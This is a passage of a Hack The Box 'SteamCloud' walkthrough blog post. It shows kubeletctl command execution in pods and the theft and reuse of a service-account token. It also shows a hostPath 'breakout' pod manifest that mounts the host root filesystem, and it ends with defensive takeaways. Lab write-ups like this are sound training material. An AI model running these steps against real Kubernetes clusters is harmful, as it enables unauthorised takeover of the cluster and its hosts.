</span></span><span class="line"><span class="cl">├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</span></span><span class="line"><span class="cl">│ <span class="m">6</span> │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
</span></span><span class="line"><span class="cl">│   │                                    │             │                         │
</span></span><span class="line"><span class="cl">├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</span></span><span class="line"><span class="cl">│ <span class="m">7</span> │ storage-provisioner                │ kube-system │ storage-provisioner     │
</span></span><span class="line"><span class="cl">│   │                                    │             │                         │
</span></span><span class="line"><span class="cl">├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</span></span><span class="line"><span class="cl">│ <span class="m">8</span> │ kube-proxy-5lw7m                   │ kube-system │ kube-proxy              │
</span></span><span class="line"><span class="cl">│   │                                    │             │                         │
</span></span><span class="line"><span class="cl">└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
</span></span></code></pre></div><p>Scan for command execution related permission:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubeletctl scan rce --server 10.10.11.133
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│                                   Node with pods vulnerable to RCE                                  │
</span></span><span class="line"><span class="cl">├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
</span></span><span class="line"><span class="cl">│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│   │              │                                    │             │                         │ RUN │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│ <span class="m">1</span> │ 10.10.11.133 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│ <span class="m">2</span> │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│ <span class="m">3</span> │              │ kube-proxy-5lw7m                   │ kube-system │ kube-proxy              │ +   │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│ <span class="m">4</span> │              │ coredns-78fcd69978-l4jd5           │ kube-system │ coredns                 │ -   │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│ <span class="m">5</span> │              │ nginx                              │ default     │ nginx                   │ +   │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│ <span class="m">6</span> │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│ <span class="m">7</span> │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
</span></span><span class="line"><span class="cl">├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</span></span><span class="line"><span class="cl">│ <span class="m">8</span> │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
</span></span><span class="line"><span class="cl">└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
</span></span></code></pre></div><h2 id="getting-user-shell">Getting User shell<a hidden class="anchor" aria-hidden="true" href="#getting-user-shell">#</a></h2>
<p>Based on <code>kubeletctl scan rce</code> command, We will go ahead and attack the ngnix pod and run the whoami command and it was observed that the pod is running as the root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/ $ kubeletctl <span class="nb">exec</span> <span class="s2">&#34;whoami&#34;</span> -p nginx -c nginx --server 10.10.11.133
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>Instead of passing command using the <code>kubeletctl exec</code> we can simply go ahead any take a shell so we can interact with a shell properly and do further enumeration to get the user flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/ $ kubeletctl <span class="nb">exec</span> <span class="s2">&#34;/bin/bash&#34;</span> -p nginx -c nginx --server 10.10.11.133
</span></span><span class="line"><span class="cl">root@nginx:/#
</span></span></code></pre></div><h3 id="user-flag-">User Flag 🚩<a hidden class="anchor" aria-hidden="true" href="#user-flag-">#</a></h3>
<p>We have the shell. Let&rsquo;s read the user flag and move ahead for root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@nginx:~# ls
</span></span><span class="line"><span class="cl">user.txt
</span></span><span class="line"><span class="cl">root@nginx:~# cat user.txt
</span></span><span class="line"><span class="cl">REDECTED_FLAG_VALUE
</span></span></code></pre></div><p>We already have the root user access but flag doesn&rsquo;t exist in the <code>/root</code> directory. We can check the env and mounted directory or we can run the linpeas as well.</p>
<p><strong>The environment variables:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@nginx:~# env
</span></span><span class="line"><span class="cl"><span class="nv">HOSTNAME</span><span class="o">=</span>nginx
</span></span><span class="line"><span class="cl"><span class="nv">NJS_VERSION</span><span class="o">=</span>1.14.2.0.2.6-1~stretch
</span></span><span class="line"><span class="cl"><span class="nv">NGINX_VERSION</span><span class="o">=</span>1.14.2-1~stretch
</span></span><span class="line"><span class="cl"><span class="nv">KUBERNETES_PORT_443_TCP_PROTO</span><span class="o">=</span>tcp
</span></span><span class="line"><span class="cl"><span class="nv">KUBERNETES_PORT_443_TCP_ADDR</span><span class="o">=</span>10.96.0.1
</span></span><span class="line"><span class="cl"><span class="nv">KUBERNETES_PORT</span><span class="o">=</span>tcp://10.96.0.1:443
</span></span><span class="line"><span class="cl"><span class="nv">PWD</span><span class="o">=</span>/root
</span></span><span class="line"><span class="cl"><span class="nv">HOME</span><span class="o">=</span>/root
</span></span><span class="line"><span class="cl"><span class="nv">KUBERNETES_SERVICE_PORT_HTTPS</span><span class="o">=</span><span class="m">443</span>
</span></span><span class="line"><span class="cl"><span class="nv">KUBERNETES_PORT_443_TCP_PORT</span><span class="o">=</span><span class="m">443</span>
</span></span><span class="line"><span class="cl"><span class="nv">KUBERNETES_PORT_443_TCP</span><span class="o">=</span>tcp://10.96.0.1:443
</span></span><span class="line"><span class="cl"><span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nv">SHLVL</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="nv">KUBERNETES_SERVICE_PORT</span><span class="o">=</span><span class="m">443</span>
</span></span><span class="line"><span class="cl"><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span class="line"><span class="cl"><span class="nv">KUBERNETES_SERVICE_HOST</span><span class="o">=</span>10.96.0.1
</span></span><span class="line"><span class="cl"><span class="nv">OLDPWD</span><span class="o">=</span>/var/run/secrets/kubernetes.io/serviceaccount
</span></span><span class="line"><span class="cl"><span class="nv">_</span><span class="o">=</span>/usr/bin/env
</span></span></code></pre></div><p><strong>The mounted directory:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@nginx:~# df -h
</span></span><span class="line"><span class="cl">df -h
</span></span><span class="line"><span class="cl">Filesystem      Size  Used Avail Use% Mounted on
</span></span><span class="line"><span class="cl">overlay         8.9G  3.2G  5.6G  37% /
</span></span><span class="line"><span class="cl">tmpfs            64M     <span class="m">0</span>   64M   0% /dev
</span></span><span class="line"><span class="cl">tmpfs           2.0G     <span class="m">0</span>  2.0G   0% /sys/fs/cgroup
</span></span><span class="line"><span class="cl">/dev/sda1       8.9G  3.2G  5.6G  37% /root
</span></span><span class="line"><span class="cl">shm              64M     <span class="m">0</span>   64M   0% /dev/shm
</span></span><span class="line"><span class="cl">tmpfs           3.9G   12K  3.9G   1% /run/secrets/kubernetes.io/serviceaccount
</span></span><span class="line"><span class="cl">tmpfs           2.0G     <span class="m">0</span>  2.0G   0% /proc/acpi
</span></span><span class="line"><span class="cl">tmpfs           2.0G     <span class="m">0</span>  2.0G   0% /sys/firmware
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@nginx:~# <span class="nb">cd</span> /run/secrets/kubernetes.io/serviceaccount
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /run/secrets/kubernetes.io/serviceaccount
</span></span><span class="line"><span class="cl">root@nginx:/run/secrets/kubernetes.io/serviceaccount# ls
</span></span><span class="line"><span class="cl">ca.crt	namespace  token
</span></span></code></pre></div><h2 id="what-is-a-kubernetes-serviceaccount">What is a Kubernetes Serviceaccount?<a hidden class="anchor" aria-hidden="true" href="#what-is-a-kubernetes-serviceaccount">#</a></h2>
<p>A <strong>ServiceAccount</strong> is an identity for processes running inside Pods. When a Pod runs, by default Kubernetes mounts credentials for a ServiceAccount into the Pod so the process can call the Kubernetes API as that identity. <strong>These credentials are how workloads authenticate to the API server.</strong></p>
<h3 id="what-lives-at-runsecretskubernetesioserviceaccount-directory">What lives at /run/secrets/kubernetes.io/serviceaccount directory?<a hidden class="anchor" aria-hidden="true" href="#what-lives-at-runsecretskubernetesioserviceaccount-directory">#</a></h3>
<p>Inside most container images we&rsquo;ll see these files:</p>
<ul>
<li><code>token</code> - a JWT bearer token. This token lets the Pod authenticate to the API server.</li>
<li><code>ca.crt</code> - CA certificate to validate the API server TLS certificate.</li>
<li><code>namespace</code> - the namespace the Pod is running in.</li>
</ul>
<h3 id="why-this-matters-for-privilege-escalation">Why this matters for privilege escalation<a hidden class="anchor" aria-hidden="true" href="#why-this-matters-for-privilege-escalation">#</a></h3>
<p>If an attacker can read that <code>token</code> file inside a pod, they can use that token to call the Kubernetes API and act with whatever RBAC permissions the ServiceAccount has.</p>
<ul>
<li><strong>Discovery</strong>: enumerate pods, namespaces, secrets, nodes, roles.</li>
<li><strong>Privilege escalation</strong>: if the service account has wide permissions, can create resources (new Pods, ClusterRoleBindings) to escalate to cluster-admin or access sensitive secrets such as cloud credentials.</li>
<li><strong>Lateral movement</strong>: read secrets, mount host filesystem, create pods with host access to extract files.</li>
</ul>
<h2 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
<p>Let&rsquo;s go inside the <code>/run/secrets/kubernetes.io/serviceaccount</code> and save the CA.crt and token file in local system so we can use it to check the permission this token has.</p>
<p><strong>Save the token:</strong>
<img loading="lazy" src="/images/HTB/SteamCloud/3.png"></p>
<p><strong>Save the ca.crt:</strong>
<img loading="lazy" src="/images/HTB/SteamCloud/4.png"></p>
<p>Now, Let&rsquo;s use the <strong>kubectl</strong> tool which <strong>allows user to interact with the Kubernetes API and the control plane</strong>.</p>
<p>We tried to use this token with the server ip <code>10.10.11.133</code> with port <code>10250</code> but server send us the certificate validation related error.</p>
<p><strong>Command:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --server https://10.10.11.133:10250 --certificate-authority<span class="o">=</span>ca.crt --token<span class="o">=</span>token get namespaces
</span></span></code></pre></div><p><strong>Server Validation Error:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">E1002 23:16:05.190516   <span class="m">35485</span> memcache.go:265<span class="o">]</span> <span class="s2">&#34;Unhandled Error&#34;</span> <span class="nv">err</span><span class="o">=</span><span class="s2">&#34;couldn&#39;t get current server API group list: Get \&#34;https://10.10.11.133:10250/api?timeout=32s\&#34;: tls: failed to verify certificate: x509: cannot validate certificate for 10.10.11.133 because it doesn&#39;t contain any IP SANs&#34;</span>
</span></span><span class="line"><span class="cl">E1002 23:16:05.890616   <span class="m">35485</span> memcache.go:265<span class="o">]</span> <span class="s2">&#34;Unhandled Error&#34;</span> <span class="nv">err</span><span class="o">=</span><span class="s2">&#34;couldn&#39;t get current server API group list: Get \&#34;https://10.10.11.133:10250/api?timeout=32s\&#34;: tls: failed to verify certificate: x509: cannot validate certificate for 10.10.11.133 because it doesn&#39;t contain any IP SANs&#34;</span>
</span></span></code></pre></div><p>We have updated the port number from <code>10250</code> to <code>8443</code>. The reason is we have seen the access forbidden error. Let&rsquo;s pass the token value and ca.crt file which will help server to validate the user access request.</p>
<p>We tried to list he pods and we are able to list the pods. From here what we can do is check what kind of permission that token and use it to get root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --server https://10.10.11.133:8443 --certificate-authority<span class="o">=</span>ca.crt --token<span class="o">=</span><span class="nv">$token</span> get pods
</span></span><span class="line"><span class="cl">NAME    READY   STATUS    RESTARTS   AGE
</span></span><span class="line"><span class="cl">nginx   1/1     Running   <span class="m">0</span>          99m
</span></span></code></pre></div><p><strong>User doesn&rsquo;t have permission to get namespace:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --server https://10.10.11.133:8443 --certificate-authority<span class="o">=</span>ca.crt --token<span class="o">=</span><span class="nv">$token</span> get namespaces
</span></span><span class="line"><span class="cl">Error from server <span class="o">(</span>Forbidden<span class="o">)</span>: namespaces is forbidden: User <span class="s2">&#34;system:serviceaccount:default:default&#34;</span> cannot list resource <span class="s2">&#34;namespaces&#34;</span> in API group <span class="s2">&#34;&#34;</span> at the cluster scope
</span></span></code></pre></div><p><strong>The user has permission to check permission:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --server https://10.10.11.133:8443 --certificate-authority<span class="o">=</span>ca.crt --token<span class="o">=</span><span class="nv">$token</span> auth can-i --list
</span></span><span class="line"><span class="cl">Resources                                       Non-Resource URLs                     Resource Names   Verbs
</span></span><span class="line"><span class="cl">selfsubjectaccessreviews.authorization.k8s.io   <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>create<span class="o">]</span>
</span></span><span class="line"><span class="cl">selfsubjectrulesreviews.authorization.k8s.io    <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>create<span class="o">]</span>
</span></span><span class="line"><span class="cl">pods                                            <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>get create list<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/.well-known/openid-configuration<span class="o">]</span>   <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/api/*<span class="o">]</span>                              <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/api<span class="o">]</span>                                <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/apis/*<span class="o">]</span>                             <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/apis<span class="o">]</span>                               <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/healthz<span class="o">]</span>                            <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/healthz<span class="o">]</span>                            <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/livez<span class="o">]</span>                              <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/livez<span class="o">]</span>                              <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/openapi/*<span class="o">]</span>                          <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/openapi<span class="o">]</span>                            <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/openid/v1/jwks<span class="o">]</span>                     <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/readyz<span class="o">]</span>                             <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/readyz<span class="o">]</span>                             <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/version/<span class="o">]</span>                           <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/version/<span class="o">]</span>                           <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/version<span class="o">]</span>                            <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                <span class="o">[</span>/version<span class="o">]</span>                            <span class="o">[]</span>               <span class="o">[</span>get<span class="o">]</span>
</span></span></code></pre></div><p>List the permission table which shows user can get, create and list pods. Let&rsquo;s create a pod with accessive privilege which can be use to do pod breakout.</p>
<p><strong>Pod creation policy, which can be used to do Pod Breakout:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">breakout</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">automountServiceAccountToken</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">breakout</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">nginx:latest</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/root</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">mount-root</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">mount-root</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
</span></span></span></code></pre></div><p><strong>Use Pod creation policy to create a pod with elevated privileges:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --server https://10.10.11.133:8443 --certificate-authority<span class="o">=</span>ca.crt --token<span class="o">=</span><span class="nv">$token</span> apply -f Pod-Breakout.yaml
</span></span><span class="line"><span class="cl">pod/breakout created
</span></span></code></pre></div><p>You can also refer to the detailed blog presented <a href="https://bishopfox.com/blog/kubernetes-pod-privilege-escalation">bishopfox</a>. They have discussed 8 different scenarios based on the limited pod creation permission user has. Checkout the blog it&rsquo;s actually interesting one to read.</p>
<p>Let&rsquo;s use the kubectl get pods command with the ca.crt file and token. It was observed that the pod we created is up and running. Let&rsquo;s move back to the kubeletctl tool because we don&rsquo;t have pod execution permission with the token we are using in the kubectl command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --server https://10.10.11.133:8443 --certificate-authority<span class="o">=</span>ca.crt --token<span class="o">=</span><span class="nv">$token</span> get pods
</span></span><span class="line"><span class="cl">NAME                          READY   STATUS             RESTARTS   AGE
</span></span><span class="line"><span class="cl">breakout                      1/1     Running            <span class="m">0</span>          36s
</span></span><span class="line"><span class="cl">nginx                         1/1     Running            <span class="m">0</span>          102m
</span></span></code></pre></div><p>Run the kubeletctl with <code>whoami</code> command on the breakout pod, and we are already running as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubeletctl <span class="nb">exec</span> <span class="s2">&#34;whoami&#34;</span> -p breakout -c breakout --server 10.10.11.133
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>Let&rsquo;s take a shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubeletctl <span class="nb">exec</span> <span class="s2">&#34;/bin/bash&#34;</span> -p breakout -c breakout --server 10.10.11.133
</span></span><span class="line"><span class="cl">root@steamcloud:/#
</span></span></code></pre></div><h2 id="root-flag-">Root Flag 🚩<a hidden class="anchor" aria-hidden="true" href="#root-flag-">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@steamcloud:~/root# ls
</span></span><span class="line"><span class="cl">root.txt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@steamcloud:~/root# cat root.txt
</span></span><span class="line"><span class="cl">REDECTED_FLAG_VALUE
</span></span></code></pre></div><h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Streamcloud is a compact but instructive lab that highlights how small misconfigurations in Kubernetes, like overly permissive service accounts, exposed APIs, or incorrect RBAC rules, quickly turn into full cluster compromise. The lab reinforces that Kubernetes security is a shared responsibility: developers, SREs, and security teams all need to work together to reduce blast radius.</p>
<h2 id="key-takeaways">Key Takeaways<a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h2>
<ul>
<li>Always apply <strong>least privilege</strong> - avoid granting cluster-admin or wildcard verbs to serviceAccounts.</li>
<li><strong>Expose only necessary APIs</strong> - kubelet and API server endpoints should be firewall/ACL protected.</li>
<li><strong>RBAC misconfigurations</strong> are a frequent root cause - regularly review roles, roleBindings, clusterRoles, and clusterRoleBindings.</li>
</ul>
<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane">https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane</a></li>
<li><a href="https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster">https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster</a></li>
<li><a href="https://www.covertswarm.com/post/k8s-pod-to-node-escape-techniques">https://www.covertswarm.com/post/k8s-pod-to-node-escape-techniques</a></li>
<li><a href="https://bishopfox.com/blog/kubernetes-pod-privilege-escalation">https://bishopfox.com/blog/kubernetes-pod-privilege-escalation</a></li>
<li><a href="https://github.com/cyberark/kubeletctl/">https://github.com/cyberark/kubeletctl/</a></li>
</ul>
<h2 id="connect-with-me">Connect with me<a hidden class="anchor" aria-hidden="true" href="#connect-with-me">#</a></h2>
<ul>
<li><a href="https://www.linkedin.com/in/bhavik-kanejiya">LinkedIn</a></li>
<li><a href="https://twitter.com/bhavik_kanejiya">Twitter</a></li>
<li><a href="https://github.com/bhavik-kanejiya">GitHub</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://bhavik-kanejiya.github.io/tags/walkthrough/">Walkthrough</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/htb/">HTB</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/linux/">Linux</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/kubernetes/">Kubernetes</a></li>
      <li><a href="https://bhavik-kanejiya.github.io/tags/pod-breakout/">Pod-Breakout</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="https://bhavik-kanejiya.github.io/blog/htb-boardlight-walkthrough/">
    <span class="title">Next »</span>
    <br>
    <span>HTB Boardlight Walkthrough</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>© 2025 Bhavik Kanejiya</span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
